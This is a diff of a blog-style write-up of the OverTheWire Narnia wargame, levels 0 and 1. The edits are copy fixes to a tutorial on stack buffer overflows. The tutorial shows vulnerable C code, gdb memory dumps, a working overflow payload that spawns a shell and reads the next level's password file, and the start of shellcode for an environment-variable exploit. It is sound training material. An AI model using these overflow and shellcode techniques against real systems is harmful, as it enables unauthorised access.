@@ -113,29 +113,29 @@
 	<a href="./tag/wargames.html"><i class="icon-tag"></i>Wargames</a>
 	<a href="./tag/linux.html"><i class="icon-tag"></i>Linux</a>
 </footer><!-- /.post-info -->                </div>
-                <p>One of my mentors, <a href="https://twitter.com/OwariDa"> <strong>Joel Eriksson</strong></a>, suggested  the quintessential <strong><a href="http://overthewire.org/wargames">WarGames</a></strong>, a collection of <strong>Security problems</strong>, divided into 14 interesting titles. I have been playing the games since last week and they are awesome! To play the WarGames you SSH to their servers with a login that indicates your current level. The purpose of the game is to solve  the current level's challenge to find the password for the next level.</p>
+                <p>One of my mentors, <a href="https://twitter.com/OwariDa"> <strong>Joel Eriksson</strong></a>, suggested the quintessential <strong><a href="http://overthewire.org/wargames">WarGames</a></strong>, a collection of <strong>Security problems</strong>, divided into 14 interesting titles. I have been playing the games since last week, and they are awesome! To play the WarGames you SSH to their servers with a login that indicates your current level. The purpose of the game is to solve the current level's challenge to find the password for the next level.</p>
 <p>Today I am talking about the first five levels of <strong><a href="http://overthewire.org/wargames/narnia">Narnia</a></strong>, which is all about <strong><a href="http://en.wikipedia.org/wiki/Buffer_overflow">buffer overflow</a></strong> and <strong><a href="http://en.wikipedia.org/wiki/Bounds_checking">inputs with no bounds checking</a></strong>.</p>
 <p>You will see that this war is not so bad when you know your weapons.</p>
-<p><strong>Disclaimer</strong>: if you haven't played WarGames but you are planing to, PLEASE DON'T READY ANY FURTHER. If you don't try to solve the problems by yourself first, you will be wasting your time.</p>
+<p><strong>Disclaimer</strong>: if you haven't played WarGames, but you are planning to, PLEASE DON'T READY ANY FURTHER. If you don't try to solve the problems by yourself first, you will be wasting your time.</p>
 <hr />
 <h2>How Stack Exploitation Works: A Crash Course</h2>
 <h3>A Process' Virtual Memory</h3>
 <p>When a program starts a process, the OS kernel provides it a piece of <a href="http://en.wikipedia.org/wiki/Computer_memory">physical memory</a>. However, all that the process sees is the <a href="http://en.wikipedia.org/wiki/Virtual_memory">virtual memory space</a> and its size and starting address. Each time a process wants to read or write to physical memory, its request must be translated from a virtual memory address to a physical memory address.</p>
 <p>I like <a href="http://www.dirac.org/linux/gdb/">Peter Jay Salzman</a>'s picture showing the process' virtual memory in terms of its address.</p>
 <p><img alt="cyber" src="http://i.imgur.com/RYEpFEA.png" /></p>
-<p>The <em>text</em> and <em>data</em> segments are the places where the program puts the code and the static data (<em>e.g</em>., global variables). This region is normally marked read-only and any attempt to write to it will result in a <a href="http://en.wikipedia.org/wiki/Segmentation_fault">segmentation violation</a>.</p>
+<p>The <em>text</em> and <em>data</em> segments are the places where the program puts the code and the static data (<em>e.g</em>., global variables). This region is normally marked read-only, and any attempt to write to it will result in a <a href="http://en.wikipedia.org/wiki/Segmentation_fault">segmentation violation</a>.</p>
 <p>Notice that arguments and environment variables get a special place in the top of the Stack (higher address).</p>
-<p>Although the <a href="http://en.wikipedia.org/wiki/Heap_(data_structure)">Heap</a> can be also fun to play with, for the purpose of these games, we will concentrate in the <strong>Stack</strong>. Remember, the <a href="https://stackoverflow.com/questions/664744/what-is-the-direction-of-stack-growth-in-most-modern-systems">direction of which the Stack grows</a> is system-dependent.</p>
+<p>Although the <a href="http://en.wikipedia.org/wiki/Heap_(data_structure)">Heap</a> can also be fun to play with, for the purpose of these games, we will concentrate on the <strong>Stack</strong>. Remember, the <a href="https://stackoverflow.com/questions/664744/what-is-the-direction-of-stack-growth-in-most-modern-systems">direction of which the Stack grows</a> is system-dependent.</p>
 <h3>What's the Stack</h3>
-<p>A Stack is an <em>abstract data type</em> that has the property that the last object placed will be the first object removed. This is also known as <em>last-in/first-out queue</em> or <em>LIFO</em>. Two of the most important operations in a Stack are <em>push</em> and <em>pop</em>.</p>
+<p>A Stack is an <em>abstract data type</em> that has the property that the last object placed will be the first object removed. This is also known as <em>last-in/first-out queue</em> or <em>LIFO</em>. Two of the most essential operations in a Stack are <em>push</em> and <em>pop</em>.</p>
 <p>You can think of a stack of books: the only way to reach the book in the bottom (the first book that was pushed) is by popping every book on the top. To learn how to write a Stack in Python, take a look at my notes on <a href="https://github.com/bt3gl/Python-and-Algorithms-and-Data-Structures/blob/master/book/book_second_edition.pdf">Python &amp; Algorithms</a>. I also made the source code available: <a href="https://github.com/bt3gl/Python-and-Algorithms-and-Data-Structures/tree/master/src/abstract_structures/Stacks">here are some examples</a>.</p>
-<p>The memory Stack frame  is a collection of (stack) frames. Every time a process calls a function, it  alters the flow of control.  In this case, a new frame needs to be added and the Stack grows downward (lower memory address).</p>
-<p>If you think about it, a Stack is a perfect object for a process: the process can push a  function (its arguments, code, etc.) into the Stack, then, in the end, it pops everything, back to where it started.</p>
+<p>The memory Stack frame is a collection of (stack) frames. Every time a process calls a function, it alters the flow of control. In this case, a new frame needs to be added, and the Stack grows downward (lower memory address).</p>
+<p>If you think about it, a Stack is a perfect object for a process: the process can push a function (its arguments, code, etc.) into the Stack, then, in the end, it pops everything, back to where it started.</p>
 <h3>Buffer Overflows in the Stack</h3>
-<p>Buffer overflows happen when we give a buffer more information than it is meant to hold.  For example, the <strong>standard C library</strong> has several functions for copying or appending strings with no bounds checking: <code>strcat()</code>, <code>strcpy()</code>, <code>sprintf()</code>, <code>vsprintf()</code>, <code>gets()</code>, and <code>scanf()</code>. These functions can  easily overflow a buffer if there the input is not validated first.</p>
-<p>To  better understand this subject, I recommend the classic <a href="http://insecure.org/stf/smashStack.html">Smashing the Stack for Fun or Profit</a> from <a href="http://en.wikipedia.org/wiki/Elias_Levy">Aleph One</a> , which was published in 1996 in the <a href="http://www.phrack.org/">Phrack magazine</a> number 49.</p>
-<h3>Assembly and the  Stack Registers</h3>
-<p>Registers are small memory storage areas built into the CPU. When the process enters the Stack,  a register called the <strong>Stack pointer</strong> (esp) points to the top of the Stack (lowest memory address).  The bottom of the Stack (higher memory address) is at a fixed address (adjusted by the kernel at run time). The CPU will implement instructions to push onto and pop stuff of the Stack.</p>
+<p>Buffer overflows happen when we give a buffer more information than it is meant to hold. For example, the <strong>standard C library</strong> has several functions for copying or appending strings with no bounds checking: <code>strcat()</code>, <code>strcpy()</code>, <code>sprintf()</code>, <code>vsprintf()</code>, <code>gets()</code>, and <code>scanf()</code>. These functions can easily overflow a buffer if  the input is not validated first.</p>
+<p>To better understand this subject, I recommend the classic <a href="http://insecure.org/stf/smashStack.html">Smashing the Stack for Fun or Profit</a> from <a href="http://en.wikipedia.org/wiki/Elias_Levy">Aleph One</a>, which was published in 1996 in the <a href="http://www.phrack.org/">Phrack magazine</a> number 49.</p>
+<h3>Assembly and the Stack Registers</h3>
+<p>Registers are small memory storage areas built into the CPU. When the process enters the Stack, a register called the <strong>Stack pointer</strong> (esp) points to the top of the Stack (lowest memory address). The bottom of the Stack (higher memory address) is at a fixed address (adjusted by the kernel at run time). The CPU will implement instructions to push onto and pop stuff of the Stack.</p>
 <p>In Assembly code this looks like:</p>
 <div class="highlight"><pre><span class="n">pushl</span> <span class="o">%</span><span class="n">ebp</span>
 <span class="n">movl</span> <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
@@ -143,9 +143,9 @@
 </pre></div>
 
 
-<p>The two first lines are the prologue. In the first line of this code, the (old) <strong>frame pointer</strong> (ebp) is pushed onto the top of the Stack (lowest memory). Then, the current <strong>esp</strong> is copied into the <strong>stack frame base pointer</strong> (ebp), making it the new frame pointer.  In the last line, space is allocated for the local variables, subtracting their size from esp (remember that memory can only be addressed in multiples of the word size, for example 4 bytes, or 32 bits).</p>
-<p>After this point, the Assembly code will show each operation step in the program. We will learn more about this  during the challenges. It's a good skill to understand the basics of Assembly, but this is outside the context of this review. Check out  this <a href="http://www.drpaulcarter.com/pcasm/">nice Assembly guide</a> if you need to. Also, <a href="http://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">this cheat sheet</a> is awesome.</p>
-<p>Ah, by  the way, you can look to the Assembly output in a C program by  using the flag <code>-S</code>:</p>
+<p>The two first lines are the prologue. In the first line of this code, the (old) <strong>frame pointer</strong> (ebp) is pushed onto the top of the Stack (lowest memory). Then, the current <strong>esp</strong> is copied into the <strong>stack frame base pointer</strong> (ebp), making it the new frame pointer. In the last line, space is allocated for the local variables, subtracting their size from esp (remember that memory can only be addressed in multiples of the word size, for example, 4 bytes, or 32 bits).</p>
+<p>After this point, the Assembly code will show each operation step in the program. We will learn more about this during the challenges. It's a good skill to understand the basics of Assembly, but this is outside the context of this review. Check out this <a href="http://www.drpaulcarter.com/pcasm/">nice Assembly guide</a> if you need to. Also, <a href="http://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">this cheat sheet</a> is awesome.</p>
+<p>Ah, by the way, you can look to the Assembly output in a C program by using the flag <code>-S</code>:</p>
 <div class="highlight"><pre><span class="nv">$ </span>gcc -S -o example1.s example1.c
 </pre></div>
 
@@ -153,7 +153,7 @@
 <hr />
 <h2>Narnia's WarGame</h2>
 <h3>The Scenario</h3>
-<p>In each of Narnia's levels we are able to <a href="http://www.thegeekstuff.com/2011/10/c-program-to-an-executable/">run a binary and read its C code</a>. The objective is to figure out from the code what vulnerability can be used to allow us to read the password of the next level (located in a folder under <code>/etc</code> in the server).</p>
+<p>In each of Narnia's levels, we are able to <a href="http://www.thegeekstuff.com/2011/10/c-program-to-an-executable/">run a binary and read its C code</a>. The objective is to figure out from the code what vulnerability can be used to allow us to read the password of the next level (located in a folder under <code>/etc</code> in the server).</p>
 <h3>Your Weapons</h3>
 <h4>Memory and Exploits Representation</h4>
 <p>When it comes to memory addresses, it's fundamental to understand <a href="http://en.wikipedia.org/wiki/Hexadecimal">hexadecimal representation</a>. You can print a HEX into <a href="http://en.wikipedia.org/wiki/ASCII">ASCII</a> with Python:</p>
@@ -162,8 +162,8 @@
 </pre></div>
 
 
-<p>Remember that Narnia's severs are <a href="http://en.wikipedia.org/wiki/X86">x86</a>, so they have <a href="http://en.wikipedia.org/wiki/Endianness">little-endian</a> representation. This means that an address <code>0xffffd546</code> is actually written as <code>\x46\xd5\xff\xff</code>.</p>
-<p>Most of the exploit we deliver in Narnia is in form of input strings. Python with the flag, <code>-c</code>, is really handy to craft what we need:</p>
+<p>Remember that Narnia's servers are <a href="http://en.wikipedia.org/wiki/X86">x86</a>, so they have <a href="http://en.wikipedia.org/wiki/Endianness">little-endian</a> representation. This means that an address <code>0xffffd546</code> is actually written as <code>\x46\xd5\xff\xff</code>.</p>
+<p>Most of the exploit we deliver in Narnia is in the form of input strings. Python with the flag, <code>-c</code>, is really handy to craft what we need:</p>
 <div class="highlight"><pre><span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*20&#39;</span>
 AAAAAAAAAAAAAAAAAAAA
 </pre></div>
@@ -171,7 +171,7 @@ AAAAAAAAAAAAAAAAAAAA
 
 <h4>Environment Variables</h4>
 <p>If you look to the picture above, you see that the system environment variables are available within the Stack. This can be useful to some exploits, where we can use these variables to import payloads.</p>
-<p>To define an environment variable we use <code>export</code>. To print its value, you can use <code>echo</code> or <code>env</code>:</p>
+<p>To define an environment variable, we use <code>export</code>. To print its value, you can use <code>echo</code> or <code>env</code>:</p>
 <div class="highlight"><pre><span class="nv">$ EGG</span><span class="o">=</span><span class="s2">&quot;0X41414141&quot;</span>
 <span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$EGG</span>
 0X41414141
@@ -181,28 +181,28 @@ AAAAAAAAAAAAAAAAAAAA
 </pre></div>
 
 
-<p>To understand more about environments variables in exploits,  take a look into my <a href="http://bt3gl.github.io/understanding-the-shellshock-vulnerability.html">Shellshock guide</a>.</p>
+<p>To understand more about environments variables in exploits, take a look into my <a href="http://bt3gl.github.io/understanding-the-shellshock-vulnerability.html">Shellshock guide</a>.</p>
 <h4>Shell Commands</h4>
 <p>The shell commands that are useful for these problems are:</p>
 <ul>
-<li><code>readelf</code>:  Displays information about ELF files (the binaries). For example, a detail that will be important soon is the fact that, in Narnia, the <em>Stack is executable</em>. This means that we can place shellcode within it. To check whether the Stack is executable see if the following output has  the flag <strong>E</strong>:</li>
+<li><code>readelf</code>: Displays information about ELF files (the binaries). For example, a detail that will be important soon is the fact that, in Narnia, the <em>Stack is executable</em>. This means that we can place shellcode within it. To check whether the Stack is executable see if the following output has the flag <strong>E</strong>:</li>
 </ul>
 <div class="highlight"><pre>narnia1@melinda:/narnia<span class="nv">$ </span>readelf -a narnia1 | grep GNU_STACK
-  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+ GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 </pre></div>
 
 
 <ul>
 <li>
-<p><code>xxd</code>:    Creates  a hex dump of a given file or standard input.  It can also convert a hex dump back to its original binary form.</p>
+<p><code>xxd</code>: Creates a hex dump of a given file or standard input. It can also convert a hex dump back to its original binary form.</p>
 </li>
 <li>
 <p><code>whoami</code>: Shows the current user, good to see whether the exploit worked!</p>
 </li>
 </ul>
 <h3>gdb and objdump</h3>
-<p>In most of the problems in Narnia, it's fundamental do understand how to debug the binary  with <strong>gdb</strong>.</p>
-<p>To learn more about gdb, you might want to check this <a href="http://www.thegeekstuff.com/2010/03/debug-c-program-using-gdb/">very introductory guide</a> or  this <a href="http://www.dirac.org/linux/gdb/">comprehensive guide</a>. However, in any problem in Narnia these steps are enough:</p>
+<p>In most of the problems in Narnia, it's fundamental do understand how to debug the binary with <strong>gdb</strong>.</p>
+<p>To learn more about gdb, you might want to check this <a href="http://www.thegeekstuff.com/2010/03/debug-c-program-using-gdb/">very introductory guide</a> or this <a href="http://www.dirac.org/linux/gdb/">comprehensive guide</a>. However, in any problem in Narnia these steps are enough:</p>
 <ul>
 <li>To start a gdb instance: <code>gdb -q &lt;EXECUTABLE&gt;</code>.</li>
 <li>To get the Assembly code we use the <code>disassemble</code> command. Constants are prefixed with a $ and registers with a %:</li>
@@ -221,7 +221,7 @@ AAAAAAAAAAAAAAAAAAAA
 
 <ul>
 <li>
-<p>To run the program: <code>(gdb) r</code>. We also can use <code>c</code> to continue to run it after the breakpoint.  We can  use <code>n</code> for the next program line. We can print things using <code>p</code>.</p>
+<p>To run the program: <code>(gdb) r</code>. We also can use <code>c</code> to continue to run it after the breakpoint. We can use <code>n</code> for the next program line. We can print things using <code>p</code>.</p>
 </li>
 <li>
 <p>To examine some memory address, we can use <code>(gdb) x/nfu A</code>, where <strong>A</strong> is the address (<em>e.g.</em>, <code>`$esp</code>), n is the number of units to print, f is the format character, and u is the unit.</p>
@@ -250,7 +250,7 @@ disas main
 </pre></div>
 
 
-<p>As a note,  there are other <strong>disassembles</strong> that you might want to try instead of gdb:</p>
+<p>As a note, there are other <strong>disassembles</strong> that you might want to try instead of gdb:</p>
 <ul>
 <li>The shell command <strong>objdump -d</strong>, which display the Assembly information from object files.</li>
 <li><a href="https://www.hex-rays.com/products/ida/index.shtml"> IDA Pro</a>.</li>
@@ -268,45 +268,45 @@ disas main
 <span class="c">#include &lt;stdlib.h&gt;</span>
 
 int main<span class="o">(){</span>
-  long <span class="nv">val</span><span class="o">=</span>0x41414141;
-  char buf<span class="o">[</span>20<span class="o">]</span>;
+ long <span class="nv">val</span><span class="o">=</span>0x41414141;
+ char buf<span class="o">[</span>20<span class="o">]</span>;
 
-  <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;</span><span class="o">)</span>;
-  <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;Here is your chance: &quot;</span><span class="o">)</span>;
-  scanf<span class="o">(</span><span class="s2">&quot;%24s&quot;</span>,&amp;buf<span class="o">)</span>;
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;</span><span class="o">)</span>;
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;Here is your chance: &quot;</span><span class="o">)</span>;
+ scanf<span class="o">(</span><span class="s2">&quot;%24s&quot;</span>,&amp;buf<span class="o">)</span>;
 
-  <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;buf: %s\n&quot;</span>,buf<span class="o">)</span>;
-  <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;val: 0x%08x\n&quot;</span>,val<span class="o">)</span>;
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;buf: %s\n&quot;</span>,buf<span class="o">)</span>;
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;val: 0x%08x\n&quot;</span>,val<span class="o">)</span>;
 
-  <span class="k">if</span><span class="o">(</span><span class="nv">val</span><span class="o">==</span>0xdeadbeef<span class="o">)</span>
-    system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span>;
-  <span class="k">else</span> <span class="o">{</span>
-    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;WAY OFF!!!!\n&quot;</span><span class="o">)</span>;
-    <span class="nb">exit</span><span class="o">(</span>1<span class="o">)</span>;
-  <span class="o">}</span>
+ <span class="k">if</span><span class="o">(</span><span class="nv">val</span><span class="o">==</span>0xdeadbeef<span class="o">)</span>
+ system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span>;
+ <span class="k">else</span> <span class="o">{</span>
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;WAY OFF!!!!\n&quot;</span><span class="o">)</span>;
+ <span class="nb">exit</span><span class="o">(</span>1<span class="o">)</span>;
+ <span class="o">}</span>
 
-  <span class="k">return </span>0;
+ <span class="k">return </span>0;
 <span class="o">}</span>
 </pre></div>
 
 
 <p>The program receives an input from the user and saves it in a buffer variable of size 20. Then, it checks if the <em>val</em> is equal to a different value of what it was declared:</p>
 <div class="highlight"><pre><span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
-        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+ <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
 </pre></div>
 
 
-<p>Since <em>val</em> obviously didn't change anywhere in the program, nothing happens and the program exits normally.</p>
-<p>However, if somehow we could  change the value of <em>val</em> to <a href="http://en.wikipedia.org/wiki/Hexspeak">0xdeadbeef</a>, the program will give us a privileged shell!</p>
+<p>Since <em>val</em> obviously didn't change anywhere in the program, nothing happens, and the program exits normally.</p>
+<p>However, if somehow we could change the value of <em>val</em> to <a href="http://en.wikipedia.org/wiki/Hexspeak">0xdeadbeef</a>, the program will give us a privileged shell!</p>
 <p>Let's think about the memory Stack. Just like in a pile of books, the local variables are pushed in the order that they are created. In the case above, <em>val</em> is pushed before <em>buf</em>, so <em>val</em> is in a higher memory address:</p>
-<div class="highlight"><pre>  <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+<div class="highlight"><pre> <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
+ <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
 </pre></div>
 
 
-<p>What happens if the input is larger than 20 bytes? In this case, there is no  bounds checking and the input overflows the variable <em>buf</em>, occupying the following space in the Stack: <em>val</em>. This is a classical case of <strong>Stack Overflow</strong>!</p>
+<p>What happens if the input is larger than 20 bytes? In this case, there are no bounds checking, and the input overflows the variable <em>buf</em>, occupying the following space in the Stack: <em>val</em>. This is a classic case of <strong>Stack Overflow</strong>!</p>
 <h3>Step 2: Visualizing the Overflow</h3>
-<p>The plan is to overflow <em>buf</em> with 20+4 bytes, so that the last four bytes  overwrites <em>val</em> with <code>0xdeadbeef</code>.</p>
+<p>The plan is to overflow <em>buf</em> with 20+4 bytes so that the last four bytes overwrites <em>val</em> with <code>0xdeadbeef</code>.</p>
 <p>Let's see how <em>val</em> is filled when we overflow byte by byte:</p>
 <div class="highlight"><pre>narnia0@melinda:/narnia<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;B&quot;*24&#39;</span>
 BBBBBBBBBBBBBBBBBBBBBBBB
@@ -363,8 +363,8 @@ val: 0xdeadbeef
 
 <p>Yay, the exploit worked!</p>
 <h3>Step 4: Getting Access to the Shell</h3>
-<p>We  were able to get access to our shell, but it closed too fast, when the program execution ended.</p>
-<p>We need to create a way to read the password before we loose the  control to the shell. A good way is pipelining some command that  waits for input, such as <code>tail</code> or <code>cat</code>.</p>
+<p>We were able to get access to our shell, but it closed too fast when the program execution ended.</p>
+<p>We need to create a way to read the password before we lose the control to the shell. A good way is pipelining some command that waits for input, such as <code>tail</code> or <code>cat</code>.</p>
 <p>It turns out that only <code>cat</code> actually prints the output:</p>
 <div class="highlight"><pre>narnia0@melinda:/narnia<span class="nv">$ </span><span class="o">(</span>python -c<span class="s1">&#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;</span>; cat<span class="o">)</span> | /narnia/narnia0
 Correct val<span class="err">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
@@ -381,24 +381,24 @@ cat /etc/narnia_pass/narnia1
 <span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
 <span class="o">(</span>gdb<span class="o">)</span> disas main
 Dump of assembler code <span class="k">for function </span>main:
-   0x080484c4 &lt;+0&gt;: push   ebp
-   0x080484c5 &lt;+1&gt;: mov    ebp,esp
-   0x080484c7 &lt;+3&gt;: and    esp,0xfffffff0
-   0x080484ca &lt;+6&gt;: sub    esp,0x30
-   0x080484cd &lt;+9&gt;: mov    DWORD PTR <span class="o">[</span>esp+0x2c<span class="o">]</span>,0x41414141
-   0x080484d5 &lt;+17&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048640
-   0x080484dc &lt;+24&gt;:  call   0x80483b0 &lt;puts@plt&gt;
-   0x080484e1 &lt;+29&gt;:  mov    eax,0x8048673
-   0x080484e6 &lt;+34&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x080484e9 &lt;+37&gt;:  call   0x80483a0 &lt;<span class="nb">printf</span>@plt&gt;
-   0x080484ee &lt;+42&gt;:  mov    eax,0x8048689
-   0x080484f3 &lt;+47&gt;:  lea    edx,<span class="o">[</span>esp+0x18<span class="o">]</span>
-   0x080484f7 &lt;+51&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-   0x080484fb &lt;+55&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x080484fe &lt;+58&gt;:  call   0x8048400 &lt;__isoc99_scanf@plt&gt;
-   0x08048503 &lt;+63&gt;:  mov    eax,0x804868e
-   0x08048508 &lt;+68&gt;:  lea    edx,<span class="o">[</span>esp+0x18<span class="o">]</span>
-   0x0804850c &lt;+72&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+ 0x080484c4 &lt;+0&gt;: push ebp
+ 0x080484c5 &lt;+1&gt;: mov ebp,esp
+ 0x080484c7 &lt;+3&gt;: and esp,0xfffffff0
+ 0x080484ca &lt;+6&gt;: sub esp,0x30
+ 0x080484cd &lt;+9&gt;: mov DWORD PTR <span class="o">[</span>esp+0x2c<span class="o">]</span>,0x41414141
+ 0x080484d5 &lt;+17&gt;: mov DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048640
+ 0x080484dc &lt;+24&gt;: call 0x80483b0 &lt;puts@plt&gt;
+ 0x080484e1 &lt;+29&gt;: mov eax,0x8048673
+ 0x080484e6 &lt;+34&gt;: mov DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+ 0x080484e9 &lt;+37&gt;: call 0x80483a0 &lt;<span class="nb">printf</span>@plt&gt;
+ 0x080484ee &lt;+42&gt;: mov eax,0x8048689
+ 0x080484f3 &lt;+47&gt;: lea edx,<span class="o">[</span>esp+0x18<span class="o">]</span>
+ 0x080484f7 &lt;+51&gt;: mov DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+ 0x080484fb &lt;+55&gt;: mov DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+ 0x080484fe &lt;+58&gt;: call 0x8048400 &lt;__isoc99_scanf@plt&gt;
+ 0x08048503 &lt;+63&gt;: mov eax,0x804868e
+ 0x08048508 &lt;+68&gt;: lea edx,<span class="o">[</span>esp+0x18<span class="o">]</span>
+ 0x0804850c &lt;+72&gt;: mov DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
 <span class="o">(</span>...<span class="o">)</span>
 End of assembler dump.
 </pre></div>
@@ -422,23 +422,23 @@ Breakpoint 1, 0x08048503 in main <span class="o">()</span>
 
 <p>Now we examine the memory in, say, 12 counts:</p>
 <div class="highlight"><pre><span class="o">(</span>gdb<span class="o">)</span> x/12xw <span class="nv">$esp</span>
-0xffffd6a0: 0x08048689  0xffffd6b8  0x08049ff4  0x08048591
-0xffffd6b0: 0xffffffff  0xf7e59d46  0x42424242  0x42424242
-0xffffd6c0: 0x42424242  0x42424242  0x42424242  0x41414100
+0xffffd6a0: 0x08048689 0xffffd6b8 0x08049ff4 0x08048591
+0xffffd6b0: 0xffffffff 0xf7e59d46 0x42424242 0x42424242
+0xffffd6c0: 0x42424242 0x42424242 0x42424242 0x41414100
 </pre></div>
 
 
-<p>The variable <em>buf</em> is in the 7-11th entries (0x42424242). Right after that  is <em>val</em> (which we know is still 0x41414141). Wait, do you see the two zeros in <code>0x41414100</code>? This is the space in the end of <em>buf</em></p>
+<p>The variable <em>buf</em> is in the 7-11th entries (0x42424242). Right after that is <em>val</em> (which we know is still 0x41414141). Wait, do you see the two zeros in <code>0x41414100</code>? This is the space at the end of <em>buf</em></p>
 <p>Finally, we test with 20 Bs + 4 Cs and confirm that our exploit works:</p>
 <div class="highlight"><pre><span class="o">(</span>gdb<span class="o">)</span> x/12xw <span class="nv">$esp</span>
-0xffffd6a0: 0x08048689  0xffffd6b8  0x08049ff4  0x08048591
-0xffffd6b0: 0xffffffff  0xf7e59d46  0x42424242  0x42424242
-0xffffd6c0: 0x42424242  0x42424242  0x42424242  0x43434343
+0xffffd6a0: 0x08048689 0xffffd6b8 0x08049ff4 0x08048591
+0xffffd6b0: 0xffffffff 0xf7e59d46 0x42424242 0x42424242
+0xffffd6c0: 0x42424242 0x42424242 0x42424242 0x43434343
 </pre></div>
 
 
 <hr />
-<h2>Level 1:  Stack Overflow  with Environment Variables</h2>
+<h2>Level 1: Stack Overflow with Environment Variables</h2>
 <h3>Step 1: Understanding the Problem</h3>
 <p>The second level starts with:</p>
 <div class="highlight"><pre><span class="n">narnia1</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">narnia1</span>
@@ -448,18 +448,18 @@ Breakpoint 1, 0x08048503 in main <span class="o">()</span>
 <span class="cp">#include &lt;stdio.h&gt;</span>
 
 <span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
-  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>
+ <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>
 
-  <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-  <span class="p">}</span>
+ <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>
+ <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+ <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+ <span class="p">}</span>
 
-  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-  <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
-  <span class="n">ret</span><span class="p">();</span>
+ <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+ <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
+ <span class="n">ret</span><span class="p">();</span>
 
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </pre></div>
 
@@ -480,24 +480,24 @@ Segmentation fault
 <p>Nope.</p>
 <p>We actually need to create a hexadecimal command to export to <strong>EGG</strong>. We do this in Assembly and all the information we need is in the <a href="http://insecure.org/stf/smashStack.html">Appendix A</a> from <a href="http://en.wikipedia.org/wiki/Elias_Levy">Aleph One</a>'s paper. This allows us to write the following:</p>
 <div class="highlight"><pre>narnia1@melinda:/tmp<span class="nv">$ </span>vi shellspawn.asm
-xor eax, eax        ; make eax equal to 0
-push eax            ; pushes null
